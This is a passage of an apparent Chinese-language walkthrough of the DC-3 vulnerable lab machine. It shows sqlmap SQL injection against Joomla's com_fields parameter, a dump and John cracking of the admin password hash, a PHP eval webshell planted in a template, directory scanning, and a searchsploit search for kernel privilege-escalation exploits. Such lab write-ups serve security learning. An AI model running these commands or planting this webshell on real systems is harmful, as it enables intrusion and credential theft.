+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__fields_groups    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__fields_values    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__fields           |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_filters   |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_links_ter |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_links     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_taxonomy_ |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_taxonomy  |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_terms_com |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_terms     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_tokens_ag |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_tokens    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__finder_types     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__jbsbackup_timese |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__jbspodcast_times |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__languages        |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__menu_types       |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__menu             |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__messages_cfg     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__messages         |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__modules_menu     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__modules          |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__newsfeeds        |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__overrider        |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__postinstall_mess |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__redirect_links   |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__schemas          |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__session          |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__tags             |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__template_styles  |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__ucm_base         |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__ucm_content      |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__ucm_history      |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__update_sites_ext |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__update_sites     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__updates          |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__user_keys        |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__user_notes       |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__user_profiles    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__user_usergroup_m |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__usergroups       |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__users            |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__utf8_conversion  |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__viewlevels       |</span>
+</span></span><span style="display:flex;"><span>+---------------------+
+</span></span></code></pre></div><p>获取<code>#__users</code>表中的字段：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D <span style="color:#e6db74">&#34;joomladb&#34;</span> -T <span style="color:#e6db74">&#34;#__users&#34;</span> --columns -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database: joomladb
+</span></span><span style="display:flex;"><span>Table: <span style="color:#75715e">#__users</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">6</span> columns<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+----------+-------------+
+</span></span><span style="display:flex;"><span>| Column   | Type        |
+</span></span><span style="display:flex;"><span>+----------+-------------+
+</span></span><span style="display:flex;"><span>| name     | non-numeric |
+</span></span><span style="display:flex;"><span>| email    | non-numeric |
+</span></span><span style="display:flex;"><span>| id       | numeric     |
+</span></span><span style="display:flex;"><span>| params   | non-numeric |
+</span></span><span style="display:flex;"><span>| password | non-numeric |
+</span></span><span style="display:flex;"><span>| username | non-numeric |
+</span></span><span style="display:flex;"><span>+----------+-------------+
+</span></span></code></pre></div><p>获取字段内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --dbms mysql -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> -C id,name,password,username --dump
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database: joomladb
+</span></span><span style="display:flex;"><span>Table: <span style="color:#75715e">#__users</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> entry<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+-----+--------+--------------------------------------------------------------+----------+
+</span></span><span style="display:flex;"><span>| id  | name   | password                                                     | username |
+</span></span><span style="display:flex;"><span>+-----+--------+--------------------------------------------------------------+----------+
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">629</span> | admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
+</span></span><span style="display:flex;"><span>+-----+--------+--------------------------------------------------------------+----------+
+</span></span></code></pre></div><p>将password写入hash文件，利用john爆破hash：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ john hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1024</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>Almost <span style="color:#66d9ef">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#66d9ef">if</span> any.
+</span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst
+</span></span><span style="display:flex;"><span>snoopy           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE 2/3 <span style="color:#f92672">(</span>2025-09-26 11:43<span style="color:#f92672">)</span> 5.263g/s 189.4p/s 189.4c/s 189.4C/s 123456..buster
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>访问admin后台/administrator，成功登录，可以修改templates中的php代码，比如在<code>index.php</code>中加入一句话木马，注意写在安全检查之前：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 一句话木马
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_REQUEST[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;_JEXEC&#39;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>;  <span style="color:#75715e">// 如果不是通过框架访问则结束代码运行
+</span></span></span></code></pre></div><p>用dirsearch扫描templates所在目录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:37<span style="color:#f92672">]</span> Starting:                                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /.htaccess.orig                                   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  303B  - /.htaccess.sample                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /.htaccess.bak1                                   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /.htaccess_orig
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  302B  - /.htaccess_extra                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  298B  - /.ht_wsr.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /.htaccess.save
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  299B  - /.htaccessBAK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  299B  - /.htaccess_sc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  300B  - /.htaccessOLD2                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  291B  - /.htm                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  292B  - /.html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  299B  - /.htaccessOLD                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  298B  - /.httr-oauth
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /.htpasswd_test
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  297B  - /.htpasswds                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:39<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  291B  - /.php                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:39<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  292B  - /.php3                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  320B  - /administrator  -&gt;  http://61.139.2.136/administrator/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /administrator/cache/                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /administrator/                                   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  534B  - /administrator/includes/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  325B  - /administrator/logs  -&gt;  http://61.139.2.136/administrator/logs/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /administrator/logs/                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /administrator/index.php                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  310B  - /bin  -&gt;  http://61.139.2.136/bin/                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /bin/                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  312B  - /cache  -&gt;  http://61.139.2.136/cache/            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /cache/                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /cli/                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:49<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  317B  - /components  -&gt;  http://61.139.2.136/components/  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:49<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /components/                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:49<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /configuration.php                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    1KB - /htaccess.txt                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /images/                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  313B  - /images  -&gt;  http://61.139.2.136/images/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /includes/                                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  315B  - /includes  -&gt;  http://61.139.2.136/includes/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /index.php                                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -    3KB - /index.php/login/                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:54<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  315B  - /language  -&gt;  http://61.139.2.136/language/      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:54<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /layouts/                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  316B  - /libraries  -&gt;  http://61.139.2.136/libraries/    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /libraries/                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    7KB - /LICENSE.txt                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:56<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  312B  - /media  -&gt;  http://61.139.2.136/media/            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:56<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /media/                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:56<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  314B  - /modules  -&gt;  http://61.139.2.136/modules/        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /modules/                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:59<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  314B  - /plugins  -&gt;  http://61.139.2.136/plugins/        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:51:59<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /plugins/                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:01<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /README.txt                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:01<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  395B  - /robots.txt.dist                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:02<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  300B  - /server-status                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:02<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /server-status/                                   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  316B  - /templates  -&gt;  http://61.139.2.136/templates/    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /templates/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /templates/beez3/                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /templates/index.html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /templates/protostar/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /templates/system/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:05<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   31B  - /tmp/                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:05<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  310B  - /tmp  -&gt;  http://61.139.2.136/tmp/                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:52:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  567B  - /web.config.txt 
+</span></span></code></pre></div><p>常规的提权方法没找到成功的，只能找内核漏洞了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ uname -a
+</span></span><span style="display:flex;"><span>Linux DC-3 4.4.0-21-generic <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux</span>
+</span></span></code></pre></div><p>对应版本<code>Ubuntu 16.04</code>，同样使用searchsploit：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ searchsploit Ubuntu 16.04
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                          |  Path
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span>Apport 2.x <span style="color:#f92672">(</span>Ubuntu Desktop 12.10 &lt; 16.04<span style="color:#f92672">)</span> - Local Code Execution                                                        | linux/local/40937.txt
+</span></span><span style="display:flex;"><span>Exim <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Debian <span style="color:#ae81ff">8</span> / Ubuntu 16.04<span style="color:#f92672">)</span> - Spool Privilege Escalation                                                           | linux/local/40054.c
+</span></span><span style="display:flex;"><span>Google Chrome <span style="color:#f92672">(</span>Fedora <span style="color:#ae81ff">25</span> / Ubuntu 16.04<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;tracker-extract&#39;</span> / <span style="color:#e6db74">&#39;gnome-video-thumbnailer&#39;</span> + <span style="color:#e6db74">&#39;totem&#39;</span> Drive-By Download    | linux/local/40943.txt
+</span></span><span style="display:flex;"><span>LightDM <span style="color:#f92672">(</span>Ubuntu 16.04/16.10<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;Guest Account&#39;</span> Local Privilege Escalation                                               | linux/local/41923.txt
+</span></span><span style="display:flex;"><span>Linux Kernel <span style="color:#f92672">(</span>Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;ldso_hwcap_64 Stac | linux_x86-64/local/42275.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - &#39;</span>ldso_dynamic Stack Clash<span style="color:#e6db74">&#39; Local Privileg | linux_x86/local/42276.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                   | linux/dos/39773.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read                               | linux/local/45175.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.4 (Ubuntu 16.04) - &#39;</span>BPF<span style="color:#e6db74">&#39; Local Privilege Escalation (Metasploit)                                         | linux/local/40759.rb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.4 (Ubuntu 16.04) - &#39;</span>snd_timer_user_ccallback<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Kernel Pointer Leak                                      | linux/dos/46529.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#39;</span>AF_PACKET<span style="color:#e6db74">&#39; Race Condition Privilege Escalation                        | linux_x86-64/local/40871.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &#39;</span>target_offset<span style="color:#e6db74">&#39; Out-of-Bounds Privilege Escalation                 | linux_x86-64/local/40049.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - &#39;</span>AF_PACKET<span style="color:#e6db74">&#39; Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;</span>double-fdput<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; bpf(BPF_PROG_LOAD) Privilege Escalation                            | linux/local/39772.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - &#39;</span>IP6T_SO_SET_REPLACE<span style="color:#e6db74">&#39; Local Privilege Escalation                                  | linux/local/40489.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                              | linux/dos/45919.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                           | linux/local/45010.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                  | linux/local/44298.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#39;</span>netfilter target_offset<span style="color:#960050;background-color:#1e0010">&#39;</span> Local Privilege Escalation                       | linux_x86-64/local/44300.c
+</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 <span style="color:#f92672">(</span>Ubuntu 14.04/16.04<span style="color:#f92672">)</span> - Local Privilege Escalation <span style="color:#f92672">(</span>KASLR / SMEP<span style="color:#f92672">)</span>                   | linux/local/43418.c
+</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span style="color:#f92672">(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span style="color:#f92672">)</span> - Local Privilege Escalation <span style="color:#f92672">(</span>KASLR / SME | linux/local/47169.c
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /usr/share/exploitdb/exploits/linux/dos/39773.txt  
+</span></span><span style="display:flex;"><span>Source: https://bugs.chromium.org/p/project-zero/issues/detail?id<span style="color:#f92672">=</span><span style="color:#ae81ff">809</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Most things in the kernel use 32-bit reference counters, relying on the
+</span></span><span style="display:flex;"><span>fact that the memory constraints of real computers make it impossible to
+</span></span><span style="display:flex;"><span>create enough references to overflow the counters. There are exceptions
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> things like <span style="color:#e6db74">`</span>struct file<span style="color:#e6db74">`</span> because it is possible to create references
+</span></span><span style="display:flex;"><span>to them with relatively little memory usage.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using BPF_MAP_TYPE_PROG_ARRAY maps, it is possible to create
+</span></span><span style="display:flex;"><span>references to BPF programs that only need sizeof<span style="color:#f92672">(</span>void*<span style="color:#f92672">)</span> bytes each
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">8</span> bytes on amd64<span style="color:#f92672">)</span>, permitting an overflow after filling ~32GB of memory
+</span></span><span style="display:flex;"><span>that is subject to RLIMIT_MEMLOCK restrictions.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The requirement <span style="color:#66d9ef">for</span> more than 32GB of RAM is relatively high, but not
+</span></span><span style="display:flex;"><span>impossible. The requirement that the allocations need to be below
+</span></span><span style="display:flex;"><span>RLIMIT_MEMLOCK is probably the bigger obstacle <span style="color:#66d9ef">for</span> exploitation: On most
+</span></span><span style="display:flex;"><span>Linux systems, every user is only permitted to allocate up to 64KiB of RAM.
+</span></span><span style="display:flex;"><span>However:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> - There are systems where RLIMIT_MEMLOCK is disabled administratively.
+</span></span><span style="display:flex;"><span> - On systems with containers <span style="color:#f92672">(</span>e.g. LXC containers<span style="color:#f92672">)</span>, usually every
